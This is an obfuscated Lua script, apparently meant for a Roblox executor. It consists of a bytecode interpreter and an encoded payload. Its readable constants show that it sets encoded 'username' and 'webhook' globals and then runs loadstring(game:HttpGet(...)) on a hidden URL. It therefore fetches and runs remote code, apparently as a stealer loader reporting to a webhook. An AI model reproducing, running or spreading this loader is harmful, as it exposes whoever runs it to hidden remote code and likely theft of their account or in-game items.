local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 79) then
			repeatNext = StrToNumber(Sub(byte, 1, 1));
			return "";
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local b = Rep(a, repeatNext);
				repeatNext = nil;
				return b;
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
			return Res - (Res % 1);
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + 1;
		return a;
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + 2);
		DIP = DIP + 2;
		return (b * 256) + a;
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 4;
		return (d * 16777216) + (c * 65536) + (b * 256) + a;
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1;
		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
		local Exponent = gBit(Right, 21, 31);
		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
		if (Exponent == 0) then
			if (Mantissa == 0) then
				return Sign * 0;
			else
				Exponent = 1;
				IsNormal = 0;
			end
		elseif (Exponent == 2047) then
			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
	end
	local function gString(Len)
		local Str;
		if not Len then
			Len = gBits32();
			if (Len == 0) then
				return "";
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local Type = gBits8();
			local Cons;
			if (Type == 1) then
				Cons = gBits8() ~= 0;
			elseif (Type == 2) then
				Cons = gFloat();
			elseif (Type == 3) then
				Cons = gString();
			end
			Consts[Idx] = Cons;
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 1) == 0) then
				local Type = gBit(Descriptor, 2, 3);
				local Mask = gBit(Descriptor, 4, 6);
				local Inst = {gBits16(),gBits16(),nil,nil};
				if (Type == 0) then
					Inst[3] = gBits16();
					Inst[4] = gBits16();
				elseif (Type == 1) then
					Inst[3] = gBits32();
				elseif (Type == 2) then
					Inst[3] = gBits32() - (2 ^ 16);
				elseif (Type == 3) then
					Inst[3] = gBits32() - (2 ^ 16);
					Inst[4] = gBits16();
				end
				if (gBit(Mask, 1, 1) == 1) then
					Inst[2] = Consts[Inst[2]];
				end
				if (gBit(Mask, 2, 2) == 1) then
					Inst[3] = Consts[Inst[3]];
				end
				if (gBit(Mask, 3, 3) == 1) then
					Inst[4] = Consts[Inst[4]];
				end
				Instrs[Idx] = Inst;
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				Inst = Instr[VIP];
				Enum = Inst[1];
				if (Enum <= 26) then
					if (Enum <= 12) then
						if (Enum <= 5) then
							if (Enum <= 2) then
								if (Enum <= 0) then
									Stk[Inst[2]] = Inst[3];
								elseif (Enum == 1) then
									local A = Inst[2];
									Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
								else
									local A = Inst[2];
									local Index = Stk[A];
									local Step = Stk[A + 2];
									if (Step > 0) then
										if (Index > Stk[A + 1]) then
											VIP = Inst[3];
										else
											Stk[A + 3] = Index;
										end
									elseif (Index < Stk[A + 1]) then
										VIP = Inst[3];
									else
										Stk[A + 3] = Index;
									end
								end
							elseif (Enum <= 3) then
								local A = Inst[2];
								Stk[A](Unpack(Stk, A + 1, Top));
							elseif (Enum > 4) then
								Env[Inst[3]] = Stk[Inst[2]];
							else
								do
									return;
								end
							end
						elseif (Enum <= 8) then
							if (Enum <= 6) then
								local A = Inst[2];
								do
									return Stk[A](Unpack(Stk, A + 1, Inst[3]));
								end
							elseif (Enum == 7) then
								Stk[Inst[2]] = Stk[Inst[3]] % Stk[Inst[4]];
							else
								Stk[Inst[2]] = #Stk[Inst[3]];
							end
						elseif (Enum <= 10) then
							if (Enum > 9) then
								local A = Inst[2];
								do
									return Unpack(Stk, A, Top);
								end
							else
								local A = Inst[2];
								local Results, Limit = _R(Stk[A](Stk[A + 1]));
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							end
						elseif (Enum > 11) then
							Env[Inst[3]] = Stk[Inst[2]];
						elseif not Stk[Inst[2]] then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					elseif (Enum <= 19) then
						if (Enum <= 15) then
							if (Enum <= 13) then
								Stk[Inst[2]]();
							elseif (Enum == 14) then
								local A = Inst[2];
								local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							else
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							end
						elseif (Enum <= 17) then
							if (Enum == 16) then
								local A = Inst[2];
								do
									return Stk[A](Unpack(Stk, A + 1, Inst[3]));
								end
							else
								Stk[Inst[2]] = Inst[3] + Stk[Inst[4]];
							end
						elseif (Enum == 18) then
							VIP = Inst[3];
						else
							Stk[Inst[2]] = Inst[3];
						end
					elseif (Enum <= 22) then
						if (Enum <= 20) then
							Stk[Inst[2]] = Env[Inst[3]];
						elseif (Enum > 21) then
							do
								return;
							end
						else
							Stk[Inst[2]] = Stk[Inst[3]];
						end
					elseif (Enum <= 24) then
						if (Enum > 23) then
							local A = Inst[2];
							local Step = Stk[A + 2];
							local Index = Stk[A] + Step;
							Stk[A] = Index;
							if (Step > 0) then
								if (Index <= Stk[A + 1]) then
									VIP = Inst[3];
									Stk[A + 3] = Index;
								end
							elseif (Index >= Stk[A + 1]) then
								VIP = Inst[3];
								Stk[A + 3] = Index;
							end
						else
							Stk[Inst[2]] = Stk[Inst[3]] % Stk[Inst[4]];
						end
					elseif (Enum == 25) then
						Stk[Inst[2]] = {};
					else
						local A = Inst[2];
						local B = Stk[Inst[3]];
						Stk[A + 1] = B;
						Stk[A] = B[Inst[4]];
					end
				elseif (Enum <= 39) then
					if (Enum <= 32) then
						if (Enum <= 29) then
							if (Enum <= 27) then
								Stk[Inst[2]] = Stk[Inst[3]] % Inst[4];
							elseif (Enum == 28) then
								Stk[Inst[2]] = Upvalues[Inst[3]];
							else
								local A = Inst[2];
								do
									return Unpack(Stk, A, Top);
								end
							end
						elseif (Enum <= 30) then
							Stk[Inst[2]] = Stk[Inst[3]] + Inst[4];
						elseif (Enum > 31) then
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Top)));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						else
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Stk[A + 1]));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						end
					elseif (Enum <= 35) then
						if (Enum <= 33) then
							local A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
						elseif (Enum > 34) then
							Stk[Inst[2]] = Stk[Inst[3]] + Inst[4];
						else
							Stk[Inst[2]] = Inst[3] + Stk[Inst[4]];
						end
					elseif (Enum <= 37) then
						if (Enum > 36) then
							Stk[Inst[2]] = Upvalues[Inst[3]];
						else
							local NewProto = Proto[Inst[3]];
							local NewUvals;
							local Indexes = {};
							NewUvals = Setmetatable({}, {__index=function(_, Key)
								local Val = Indexes[Key];
								return Val[1][Val[2]];
							end,__newindex=function(_, Key, Value)
								local Val = Indexes[Key];
								Val[1][Val[2]] = Value;
							end});
							for Idx = 1, Inst[4] do
								VIP = VIP + 1;
								local Mvm = Instr[VIP];
								if (Mvm[1] == 41) then
									Indexes[Idx - 1] = {Stk,Mvm[3]};
								else
									Indexes[Idx - 1] = {Upvalues,Mvm[3]};
								end
								Lupvals[#Lupvals + 1] = Indexes;
							end
							Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
						end
					elseif (Enum > 38) then
						local A = Inst[2];
						local Index = Stk[A];
						local Step = Stk[A + 2];
						if (Step > 0) then
							if (Index > Stk[A + 1]) then
								VIP = Inst[3];
							else
								Stk[A + 3] = Index;
							end
						elseif (Index < Stk[A + 1]) then
							VIP = Inst[3];
						else
							Stk[A + 3] = Index;
						end
					else
						local NewProto = Proto[Inst[3]];
						local NewUvals;
						local Indexes = {};
						NewUvals = Setmetatable({}, {__index=function(_, Key)
							local Val = Indexes[Key];
							return Val[1][Val[2]];
						end,__newindex=function(_, Key, Value)
							local Val = Indexes[Key];
							Val[1][Val[2]] = Value;
						end});
						for Idx = 1, Inst[4] do
							VIP = VIP + 1;
							local Mvm = Instr[VIP];
							if (Mvm[1] == 41) then
								Indexes[Idx - 1] = {Stk,Mvm[3]};
							else
								Indexes[Idx - 1] = {Upvalues,Mvm[3]};
							end
							Lupvals[#Lupvals + 1] = Indexes;
						end
						Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
					end
				elseif (Enum <= 46) then
					if (Enum <= 42) then
						if (Enum <= 40) then
							Stk[Inst[2]] = #Stk[Inst[3]];
						elseif (Enum == 41) then
							Stk[Inst[2]] = Stk[Inst[3]];
						else
							local A = Inst[2];
							local B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
						end
					elseif (Enum <= 44) then
						if (Enum > 43) then
							Stk[Inst[2]] = {};
						else
							local A = Inst[2];
							local Step = Stk[A + 2];
							local Index = Stk[A] + Step;
							Stk[A] = Index;
							if (Step > 0) then
								if (Index <= Stk[A + 1]) then
									VIP = Inst[3];
									Stk[A + 3] = Index;
								end
							elseif (Index >= Stk[A + 1]) then
								VIP = Inst[3];
								Stk[A + 3] = Index;
							end
						end
					elseif (Enum > 45) then
						local A = Inst[2];
						local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
						Top = (Limit + A) - 1;
						local Edx = 0;
						for Idx = A, Top do
							Edx = Edx + 1;
							Stk[Idx] = Results[Edx];
						end
					else
						VIP = Inst[3];
					end
				elseif (Enum <= 49) then
					if (Enum <= 47) then
						local A = Inst[2];
						Stk[A](Unpack(Stk, A + 1, Top));
					elseif (Enum == 48) then
						if not Stk[Inst[2]] then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					else
						Stk[Inst[2]] = Env[Inst[3]];
					end
				elseif (Enum <= 51) then
					if (Enum == 50) then
						Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
					else
						Stk[Inst[2]] = Stk[Inst[3]] % Inst[4];
					end
				elseif (Enum > 52) then
					Stk[Inst[2]]();
				else
					local A = Inst[2];
					local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Top)));
					Top = (Limit + A) - 1;
					local Edx = 0;
					for Idx = A, Top do
						Edx = Edx + 1;
						Stk[Idx] = Results[Edx];
					end
				end
				VIP = VIP + 1;
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
return VMCall("LOL!133O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403083O00757365726E616D65035A3O00427942675E54772D383A533D4D632040726B54437A50487A2263377939782262376B363A226B372D3955223A36593C2B22433739387622523926226B367D353D226337433A6D2221364A38722254373335302O223D5F22713D7E03073O00776562682O6F6B03BA042O004263422O4A6578795A515F5C5831506C6E752O482O3A6E243B72745C674555654F5A7A662O6D75313A5A7B2B387C5E4D2030204349426B42674C586A6B615624522E37762O3C5C55674D4C3C67784B3F69685A36566F6B646C70574B553A4B7479535D67682D68794C5F7B79382B522B71744C3F59625669665D746471445E266F32675339567479502B516B39764727726E59334C4B597C535C375D3A385A3269737C2B365B4D3478755E26463B2O5F46345B474626777068413534745348246F21694156294754377849385D2A5B413E614F5D5560517D363C532F5E5647313B7A4B2O474D56413A7D46735736583277764D69374E675E75503646583F75786B5F4D30385D7D767459746C465C7E527028367D4D7E68217C39507D76474A61763747753D2A7B277550564D57677E357C50355A674C4E66382454664A292O663D5A4B415D307E3022353761354C224E37263843227C39702239365B3D6722623A78223C39612260376C377D222136763A21227736763536223036322260362E372422663A68222C3945226F377837782262363F3C4F226B385A224D362B367E224E36293C5C227E372F356F2255365B362D226E373D3774223136243969227937383634224D3B7C226B36393C5D2228375B372922463E612269372E226B365C3A6A22773A7E22473B5A223F367E3D6C224A3C2B227E374D3845226D3B212264385F225F367B3C50224F364B363C224A36733934225F36593E69226A3643393D225B37763A402242372O365022543A6D22293E5622793A4522533638357D2273363C3660223837403569225B36413946227638592250366222453766364A2228367E3549222536493577227A37723A3C22243646225B3A6522653725376E226A376E357122213662394C22363734365A226737793A3D227D3D7C224436763A3F2241365C3B5D2247374A223B3649362A22643748397622793771395B2252373E385222723B6A224D376D2223362F3D78226D372F3A2322503772227E375238252250363D38282233373638232225377B372A224D36633B5F227D3671366A2260363F3E61224B36293C66223837623A64227E36293A45224C3B76222O3A54225B3771223A3D4222643B232266365C387B223A376D365B2260373A3650224336443B642225363A3B242257366C3748223E36653E3922663668383A226C362O382A222B367237672245365B3C37223A3730352122703E35224136243963223B3A7A224C377A3761227E3756393522282O3C224336473A60224A37723627225E3644385B223639332227365E3E2O227B37583951225C3773224B364F386F224436453D6E227A3777393F22463B6C22403762376A22553756364D227236233E7122443650223A372A355C2253373F373F222F365D37742O2236693A2A226C375B3873226E366A373D22393646227A3775355A227E36383E6E225B396B2O2237223536222637653779224E3857226F37443725225C36723A3E223336272272364A226E3735385422603951223B36483E7622233B3A224D364A3D49222437723A7422623729353E223E3B6E2224382D222B3743354D22753777395A226B36253756226A363E3656224A385E223D377838372279366B3C67225B374F22483766386E225D3771393C22713D3C226536693944222E363F3B35227E372D3941030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034E3O00D9D7CF35F5E18851C3C2CC6BE1B2D316C4C1CE36E3A9C411DFD7DE2BF2F5C411DC8CE826F4B2D70AC28EEF20F4B6C21A9EF0D837EFABD30DEEE1DE31E7F4CA1FD8CD9421E7F6CF11DEC79529F3BA03083O007EB1A3BB4586DBA700264O002C7O001231000100013O00200F000100010002001231000200013O00200F000200020003001231000300013O00200F000300030004001231000400053O0006300004000B0001000100042D3O000B0001001231000400063O00200F000500040007001231000600083O00200F000600060009001231000700083O00200F00070007000A00062600083O000100062O00293O00074O00293O00014O00293O00054O00293O00024O00293O00034O00293O00063O0012130009000C3O00120C0009000B3O0012130009000E3O00120C0009000D3O0012310009000F3O001231000A00103O00201A000A000A00112O0015000C00083O001213000D00123O001213000E00134O000E000C000E4O0034000A6O002100093O00022O000D0009000100012O00163O00013O00013O00023O00026O00F03F026O00704002264O002C00025O001213000300014O002800045O001213000500013O0004020003002100012O002500076O0015000800024O0025000900014O0025000A00024O0025000B00034O0025000C00044O0015000D6O0015000E00063O00201E000F000600012O000E000C000F4O0021000B3O00022O0025000C00034O0025000D00044O0015000E00014O0028000F00014O0017000F0006000F001022000F0001000F2O0028001000014O001700100006001000102200100001001000201E0010001000012O000E000D00104O0034000C6O0021000A3O000200201B000A000A00022O00090009000A4O000300073O00010004180003000500012O0025000300054O0015000400024O0010000300044O001D00036O00163O00017O00", GetFEnv(), ...);
